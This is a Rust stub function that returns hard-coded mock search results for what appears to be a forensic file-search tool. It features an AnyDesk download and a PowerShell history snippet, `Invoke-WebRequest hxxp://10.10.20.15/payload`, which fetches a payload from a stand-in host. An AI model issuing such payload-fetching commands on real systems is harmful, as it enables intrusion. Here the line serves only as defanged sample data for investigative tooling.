use transport::dto::{SearchHighlightDto, SearchHitDto, SearchResultPageDto, SearchSnippetDto};

pub fn search_files(query: String) -> SearchResultPageDto {
    SearchResultPageDto {
        total: 2,
        took_ms: 45,
        items: vec![
            SearchHitDto {
                file_id: "file-001".into(),
                path: "C:/Users/Alice/Downloads/AnyDesk.exe".into(),
                score: if query.is_empty() { 0.91 } else { 0.96 },
                snippets: vec![SearchSnippetDto {
                    text: "AnyDesk.exe downloaded and executed by user Alice".into(),
                    highlights: vec![SearchHighlightDto { start: 0, end: 7 }],
                }],
            },
            SearchHitDto {
                file_id: "file-002".into(),
                path: "C:/Users/Alice/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt".into(),
                score: if query.is_empty() { 0.75 } else { 0.88 },
                snippets: vec![SearchSnippetDto {
                    text: "powershell Invoke-WebRequest hxxp://10.10.20.15/payload".into(),
                    highlights: vec![SearchHighlightDto { start: 11, end: 28 }],
                }],
            },
        ],
    }
}
